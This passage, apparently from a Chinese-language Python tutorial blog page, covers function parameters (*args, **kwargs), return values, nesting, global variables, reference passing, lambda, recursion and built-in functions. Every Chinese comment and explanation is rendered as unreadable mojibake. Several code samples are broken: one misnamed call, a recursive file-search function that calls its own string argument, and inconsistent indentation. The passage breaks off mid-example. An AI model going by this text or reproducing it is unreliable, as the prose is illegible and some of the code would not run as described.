class="comment">#å¯ç›´æ¥è°ƒç”¨ï¼Œè‹¥æœ‰å‚æ•°çš„æ—¶å€™å¯¹ä¸ªæ•°ä¸å¼ºåˆ¶ï¼Œä½†å¦‚æœåªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™é»˜è®¤èµ‹å€¼ç»™å‰é¢çš„å½¢å‚</span></span><br></pre></td></tr></table></figure>

<h6 id="å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°"><a href="#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°" class="headerlink" title="#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°"></a>#å¯é€‰å‚æ•°ï¼ˆä¸å®šé•¿å‚æ•°</h6><p><em>æ¥å—çš„æ•°æ®æ˜¯ä¸€ä¸ªå…ƒç»„ç±»å‹</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å½“å‚æ•°çš„ä¸ªæ•°ä¸ç¡®å®šæ—¶ä½¿ç”¨ï¼Œæ¯”è¾ƒçµæ´»</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    å¯å˜é•¿çš„å‚æ•°ç±»å‹</span></span><br><span class="line"><span class="string">    ç´¯åŠ </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>)  </span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>,<span class="number">2</span>)  <span class="comment">#ä»¥å…ƒç»„å½¢å¼è¿›è¡Œè¾“å‡º</span></span><br><span class="line"><span class="comment">#forå¾ªç¯å®ç°å¤šå‚æ•°éå†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">   	 	<span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        	<span class="built_in">sum</span> += i</span><br><span class="line">        	<span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="å…³é”®å­—å¯å˜å‚æ•°"><a href="#å…³é”®å­—å¯å˜å‚æ•°" class="headerlink" title="#å…³é”®å­—å¯å˜å‚æ•°"></a>#å…³é”®å­—å¯å˜å‚æ•°</h6><p><em>æ¥å—çš„æ•°æ®æ˜¯å­—å…¸ç±»å‹</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ** æ¥å®šä¹‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨å‡½æ•°ä½“å†… å‚æ•°å…³é”®å­—æ˜¯ä¸€ä¸ªå­—å…¸ç±»å‹ï¼Œkeyæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyFunc</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">keyFunct(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">#æŠ¥é”™</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;11&#x27;</span>&#125;</span><br><span class="line">keyFunc() <span class="comment">#ç©ºå­—å…¸</span></span><br><span class="line">keyFunc(**a)  <span class="comment">#ç›´æ¥ä¼ å­—å…¸çš„æ—¶å€™è¦åŠ ä¸Š **</span></span><br><span class="line">keyFunc(name=<span class="string">&#x27;peter&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#åº”è¯¥ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¼ å‚</span></span><br></pre></td></tr></table></figure>

<h6 id="ç»„åˆä½¿ç”¨"><a href="#ç»„åˆä½¿ç”¨" class="headerlink" title="#ç»„åˆä½¿ç”¨"></a>#ç»„åˆä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comx1</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">comx1(age=<span class="number">18</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯é€‰å‚æ•°å¿…é¡»æ”¾åœ¨å…³é”®å­—å¯é€‰å‚æ•°ä¹‹å‰</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å‡½æ•°è¿”å›å€¼"><a href="#0x03-å‡½æ•°è¿”å›å€¼" class="headerlink" title="0x03:å‡½æ•°è¿”å›å€¼"></a>0x03:å‡½æ•°è¿”å›å€¼</h5><p>*å‡½æ•°éœ€è¦è¿”å›å¤šä¸ªç»“æœæ—¶ï¼Œå°†è¦è¿”å›çš„å€¼ç”¨é€—å·éš”å¼€ï¼Œæœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰è¿”å›å€¼çš„å…ƒç»„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å‡½æ•°æ‰§è¡Œå®Œä»¥åä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœå‡½æ•°çš„å†…éƒ¨æœ‰returnè¿™ä¸ªå…³é”®å­—ï¼Œå°±å¯ä»¥è¿”å›å®é™…çš„å€¼ï¼Œå¦åˆ™è¿”å›None</span><br><span class="line">2.å¯ä»¥è¿”å›ä»»æ„ç±»å‹ï¼Œå–å†³äºreturnå…³é”®å­—åé¢çš„å…ƒç´ çš„ç±»å‹</span><br><span class="line">3.ç»™è°ƒç”¨æ–¹è¿”å›æ•°æ®</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = a+b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a+b=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">sum</span>(a,b)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#ä»¥å…ƒç»„ç±»å‹è¾“å‡º</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanshu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(hanshu())  <span class="comment">#ä»¥å­—å…¸ç±»å‹è¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(hanshu()))  <span class="comment">#å­—å…¸</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-å‡½æ•°åµŒå¥—"><a href="#0x04-å‡½æ•°åµŒå¥—" class="headerlink" title="0x04:å‡½æ•°åµŒå¥—"></a>0x04:å‡½æ•°åµŒå¥—</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----æ‰§è¡Œä»£ç çœç•¥-----&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----start-----&quot;</span>)</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----end-----&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨è°ƒç”¨fun2å‡½æ•°çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°fun1å‡½æ•°ï¼Œfun1å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åç»§ç»­æ‰§è¡Œä¹‹åçš„ä»£ç </span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åˆ†ç±»ï¼š</span><br><span class="line">æœ‰å‚æ•°æ— è¿”å›å€¼</span><br><span class="line">æœ‰å‚æ•°æœ‰è¿”å›å€¼</span><br><span class="line">æ— å‚æ•°æ— è¿”å›å€¼</span><br><span class="line">æ— å‚æ•°æœ‰è¿”å›å€¼</span><br></pre></td></tr></table></figure>

<h3 id="5-å‡½æ•°è¿›é˜¶"><a href="#5-å‡½æ•°è¿›é˜¶" class="headerlink" title="5.å‡½æ•°è¿›é˜¶"></a>5.å‡½æ•°è¿›é˜¶</h3><h5 id="0x01-å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"><a href="#0x01-å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡" class="headerlink" title="0x01:å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡"></a>0x01:å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡</h5><p><strong>å±€éƒ¨å˜é‡ï¼š</strong></p>
<p>å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆç”Ÿæ•ˆèŒƒå›´åªåœ¨å‡½æ•°çš„å†…éƒ¨ï¼Œä¸åŒçš„å‡½æ•°å¯ä»¥å®šä¹‰ç›¸åŒçš„å±€éƒ¨å˜é‡äº’ä¸å¹²æ‰°ï¼Œå±€éƒ¨å˜é‡ä¸ºäº†ä¸´æ—¶çš„ä¿å­˜æ•°æ®ï¼Œéœ€è¦åœ¨å‡½æ•°ä¸­å®šä¹‰æ¥è¿›è¡Œå­˜å‚¨</p>
<p><strong>å…¨å±€å˜é‡ï¼š</strong></p>
<p>å½“å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡å‡ºç°é‡å¤å®šä¹‰çš„æ—¶å€™ï¼Œç¨‹åºä¼šä¼˜å…ˆæ‰§è¡Œä½¿ç”¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡</p>
<p>å¦‚æœåœ¨å‡½æ•°çš„å†…éƒ¨æƒ³å¯¹å…¨å±€å˜é‡è¿›è¡Œä¿®æ”¹çš„è¯ï¼Œå¿…é¡»ä½¿ç”¨globalå…³é”®å­—è¿›è¡Œå£°æ˜</p>
<p>ä¿®æ”¹å…¨å±€å˜é‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGlobal</span>():</span></span><br><span class="line">	<span class="keyword">global</span> name</span><br><span class="line">	name = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">changeGlobal()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h5 id="0x02-å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼"><a href="#0x02-å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼" class="headerlink" title="0x02:å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼"></a>0x02:å‡½æ•°å‚æ•°å¼•ç”¨ä¼ å€¼</h5><p><strong>ä¸å¯å˜ç±»å‹</strong></p>
<p>int str å…ƒç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;açš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xçš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xçš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(x)))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">func(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;açš„åœ°å€ï¼š&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># açš„åœ°å€ï¼š140706376876304</span></span><br><span class="line"><span class="comment"># xçš„åœ°å€ï¼š140706376876304</span></span><br><span class="line"><span class="comment"># xçš„åœ°å€ï¼š140706376876336</span></span><br><span class="line"><span class="comment"># 1</span></span><br></pre></td></tr></table></figure>

<p><strong>å¯å˜ç±»å‹</strong></p>
<p>å­—å…¸ åˆ—è¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">listA = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">parms</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    parms.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(parms))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;å†…éƒ¨çš„&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(parms))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(listA))</span><br><span class="line">func(listA)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¤–éƒ¨çš„&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(listA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># 2715138216456</span></span><br><span class="line"><span class="comment"># å†…éƒ¨çš„[[1, 2, 3, 4]] </span></span><br><span class="line"><span class="comment"># å¤–éƒ¨çš„[[1, 2, 3, 4]]  æ•°æ®åŒæ­¥å˜åŒ–</span></span><br></pre></td></tr></table></figure>

<p><strong>å°ç»“</strong></p>
<p>1.åœ¨pythonä¸­ ä¸‡ç‰©çš†å¯¹è±¡ï¼Œåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå®å‚ä¼ é€’çš„å°±æ˜¯å¯¹è±¡çš„å¼•ç”¨</p>
<p>2.æ›´å¥½çš„æŠŠæ§ åœ¨å‡½æ•°å†…éƒ¨çš„å¤„ç†æ˜¯å¦ä¼šå½±å“å‡½æ•°å¤–éƒ¨æ•°æ®çš„å˜åŒ–</p>
<p>3.å‚æ•°ä¼ é€’æ˜¯é€šè¿‡å¯¹è±¡å¼•ç”¨æ¥å®Œæˆ</p>
<h5 id="0x03-åŒ¿åå‡½æ•°"><a href="#0x03-åŒ¿åå‡½æ•°" class="headerlink" title="0x03:åŒ¿åå‡½æ•°"></a>0x03:åŒ¿åå‡½æ•°</h5><p>åˆ©ç”¨<code>lambda</code>å…³é”®å­—åˆ›å»ºåŒ¿åå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda å‚æ•°1,å‚æ•°2,å‚æ•°3:æ‰§è¡Œä»£ç è¯­å¥</span><br></pre></td></tr></table></figure>

<p>1.æ²¡æœ‰åå­—çš„å‡½æ•°</p>
<p>2.åŒ¿åå‡½æ•°å†’å·åé¢çš„è¡¨è¾¾å¼æœ‰ä¸”åªæœ‰ä¸€ä¸ªï¼ˆæ˜¯è¡¨è¾¾å¼ï¼Œä¸æ˜¯è¯­å¥</p>
<p>3.åŒ¿åå‡½æ•°è‡ªå¸¦<code>return</code></p>
<p>4.ç”¨å˜é‡æ¥æ”¶åŒ¿åå‡½æ•°ï¼Œç”¨å˜é‡è¿›è¡Œè°ƒç”¨</p>
<p>5.ä½†æ˜¯åªèƒ½æ˜¯å•ä¸ªè¡¨è¾¾å¼ï¼Œä¸æ˜¯ä¸€ä¸ªä»£ç å—ï¼Œåªæ˜¯ä¸ºäº†æ»¡è¶³ç®€å•å‡½æ•°çš„åœºæ™¯ï¼Œä»…ä»…èƒ½å°è£…æœ‰é™çš„é€»è¾‘ï¼Œå¤æ‚é€»è¾‘å®ç°ä¸äº†</p>
<p>egï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="built_in">print</span>(a(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"></span><br><span class="line">d = <span class="keyword">lambda</span> a,b,c:a*b*c</span><br><span class="line"><span class="built_in">print</span>(d(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br></pre></td></tr></table></figure>

<p>åŒåˆ†æ”¯å˜ä½†åˆ†æ”¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b if a else c</span><br><span class="line">#å¦‚æœaæˆç«‹åˆ™è¿”å›b å¦åˆ™è¿”å›c</span><br></pre></td></tr></table></figure>

<p>ç»“åˆï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç›´æ¥è°ƒç”¨</span></span><br><span class="line">jg = (<span class="keyword">lambda</span> x,y:x <span class="keyword">if</span> x&gt;y <span class="keyword">else</span> y)(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(jg)</span><br></pre></td></tr></table></figure>

<h5 id="0x04-é€’å½’å‡½æ•°"><a href="#0x04-é€’å½’å‡½æ•°" class="headerlink" title="0x04:é€’å½’å‡½æ•°"></a>0x04:é€’å½’å‡½æ•°</h5><p>å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨å†…éƒ¨ä¸è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œè€Œæ˜¯è‡ªå·±æœ¬èº«çš„è¯ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯é€’å½’å‡½æ•°</p>
<p>é€’å½’å‡½æ•°å¿…é¡»æœ‰ä¸€ä¸ªç»“æŸæ¡ä»¶ï¼Œå¦åˆ™é€’å½’æ— æ³•ç»“æŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ±‚é˜¶ä¹˜</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x * func(x-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨¡æ‹Ÿæ–‡ä»¶æŸ¥æ‰¾ å®ç°æ ‘å½¢ç»“æ„çš„éå†</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#å¼•å…¥æ–‡ä»¶æ“ä½œæ¨¡å—</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findFile</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    listRs = os.listdir(file_path) <span class="comment">#å¾—åˆ°è¯¥è·¯å¾„ä¸‹æ‰€æœ‰çš„æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> listRs:</span><br><span class="line">        full_path = os.path.join(file_path, item)</span><br><span class="line">        <span class="comment">#è·å–å®Œæ•´çš„æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(full_path):</span><br><span class="line">        <span class="comment">#åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹</span></span><br><span class="line">        	file_path(full_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>1.è‡ªå·±è°ƒç”¨è‡ªå·±</p>
<p>2.å¿…é¡»æœ‰ä¸€ä¸ªæ˜ç¡®çš„ç»“æŸæ¡ä»¶</p>
<p>3.ä¼˜ç‚¹ï¼šé€»è¾‘ç®€å•ï¼Œå®šä¹‰ç®€å•</p>
<p>4.ç¼ºç‚¹ï¼šå®¹æ˜“å¯¼è‡´æ ˆæº¢å‡ºã€‚å†…å­˜èµ„æºç´§å¼ ï¼Œç”šè‡³å†…å­˜æ³„æ¼</p>
<h3 id="6-å†…ç½®å‡½æ•°"><a href="#6-å†…ç½®å‡½æ•°" class="headerlink" title="6.å†…ç½®å‡½æ•°"></a>6.å†…ç½®å‡½æ•°</h3><h5 id="0x01-æ•°å­¦è¿ç®—"><a href="#0x01-æ•°å­¦è¿ç®—" class="headerlink" title="0x01:æ•°å­¦è¿ç®—"></a>0x01:æ•°å­¦è¿ç®—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs()  æ±‚ç»å¯¹å€¼å‡½æ•°</span><br><span class="line">è¿”å›æ•°å­—çš„ç»å¯¹å€¼</span><br><span class="line"></span><br><span class="line">round()</span><br><span class="line">æ±‚è¿‘ä¼¼å€¼</span><br><span class="line"></span><br><span class="line">pow()</span><br><span class="line">æ±‚æ¬¡æ–¹</span><br><span class="line"></span><br><span class="line">divmod()</span><br><span class="line">æ±‚å•†å’Œä½™æ•°</span><br><span class="line"></span><br><span class="line">max()</span><br><span class="line">min()</span><br><span class="line">æœ€å€¼</span><br><span class="line"></span><br><span class="line">sum()</span><br><span class="line">å’Œ</span><br><span class="line"></span><br><span class="line">eval()</span><br><span class="line">å°†å­—ç¬¦ä¸²å½“ä½œä»£ç </span><br></pre></td></tr></table></figure>

<h5 id="0x02-ç±»å‹è½¬æ¢"><a href="#0x02-ç±»å‹è½¬æ¢" class="headerlink" title="0x02:ç±»å‹è½¬æ¢"></a>0x02:ç±»å‹è½¬æ¢</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æ•°æ®ç±»å‹çš„è½¬æ¢</span><br><span class="line">int()</span><br><span class="line">float()</span><br><span class="line">str()</span><br><span class="line"></span><br><span class="line">#asciiç ç›¸äº’è½¬æ¢</span><br><span class="line">ord()</span><br><span class="line">chr() </span><br><span class="line"></span><br><span class="line">bool()</span><br><span class="line"></span><br><span class="line">bin()</span><br><span class="line">hex()</span><br><span class="line">oct() è½¬æˆå…«è¿›åˆ¶</span><br><span class="line"></span><br><span class="line">list() å…ƒç»„è½¬æ¢æˆåˆ—è¡¨</span><br><span class="line">tuple()</span><br><span class="line">dict() åˆ›å»ºå­—å…¸</span><br><span class="line"></span><br><span class="line">bytes()</span><br></pre></td></tr></table></figure>

<p><code>dict()</code>å­—å…¸æ“ä½œï¼ˆä¸»è¦ç”¨äºåˆ›å»ºå­—å…¸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># class dict(**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(mapping,**kwarg)</span></span><br><span class="line"><span class="comment"># class dict(iterable,**kwarg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment"># **kwarg  å…³é”®å­—</span></span><br><span class="line"><span class="comment"># mapping å…ƒç´ çš„å®¹å™¨</span></span><br><span class="line"><span class="comment"># iterable å¯è¿­ä»£å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿”å›å€¼</span></span><br><span class="line"><span class="comment">#è¿”å›ä¸€ä¸ªå­—å…¸</span></span><br><span class="line"></span><br><span class="line">dic = <span class="built_in">dict</span>(name=<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dic))</span><br><span class="line">dic.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;)  <span class="comment">#æ›´æ–°æ•°æ®æˆ–è€…å¢åŠ æ•°æ®</span></span><br><span class="line">dic[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br></pre></td></tr></table></figure>

<p><code>bytes()</code>è½¬ä¸ºå­—èŠ‚æ•°ç»„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># class bytearray([source[,encoding]]])</span></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment"># source ä¸ºæ•´æ•°ï¼Œåˆ™è¿”å›ä¸€ä¸ªé•¿åº¦ä¸ºsourceçš„åˆå§‹åŒ–æ•°ç»„</span></span><br><span class="line"><span class="comment">#        ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™æŒ‰ç…§æŒ‡å®šçš„encodingå°†å­—ç¬¦ä¸²è½¬æ¢æˆå­—èŠ‚åºåˆ—</span></span><br><span class="line"><span class="comment">#        ä¸ºå¯è¿­ä»£ç±»å‹ï¼Œåˆ™å…ƒç´ å¿…é¡»ä¸º[0,255]ä¸­çš„æ•´æ•°</span></span><br><span class="line"><span class="comment">#        ä¸ºä¸bufferæ¥å£ä¸€è‡´çš„å¯¹è±¡ï¼Œåˆ™æ¬¡å¯¹è±¡ä¹Ÿå¯ä»¥è¢«ç”¨äºåˆå§‹åŒ–bytes</span></span><br><span class="line"><span class="comment">#        å¦‚æœæ²¡æœ‰è¾“å…¥ä»»ä½•å‚æ•°ï¼Œé»˜è®¤å°±æ˜¯åˆå§‹åŒ–æ•°ç»„ä¸º0ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="comment">#è¿”å›å€¼</span></span><br><span class="line"><span class="comment">#è¿”å›æ–°å­—èŠ‚æ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(<span class="string">&#x27;wæˆ‘like python&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="0x03-åºåˆ—æ“ä½œ"><a href="#0x03-åºåˆ—æ“ä½œ" class="headerlink" title="0x03:åºåˆ—æ“ä½œ"></a>0x03:åºåˆ—æ“ä½œ</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">all()</span><br><span class="line">any()</span><br><span class="line">sorted()</span><br><span class="line">reverse()</span><br><span class="line">range()</span><br><span class="line">zip()</span><br><span class="line">enumerate()</span><br></pre></td></tr></table></figure>

<p><code>all()</code>ä¸çš„å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨äºåˆ¤æ–­ç»™å®šçš„å¯è¿­ä»£å‚æ•°iterableä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½ä¸ºTRUEï¼Œå¦‚æœæ˜¯è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseå…ƒç´ ï¼Œé™¤äº†æ˜¯0ï¼Œç©ºï¼ŒFALSEå¤–éƒ½ç®—TRUE</span></span><br><span class="line"><span class="comment">#å‡½æ•°ç­‰ä»·äºï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># all(iterable)</span></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment">#iterable å…ƒç»„æˆ–è€…åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#tip</span></span><br><span class="line"><span class="comment">#ç©ºå…ƒç»„ã€ç©ºåˆ—è¡¨è¿”å›å€¼ä¸ºTrue</span></span><br><span class="line"></span><br><span class="line">li = []</span><br><span class="line">tup = 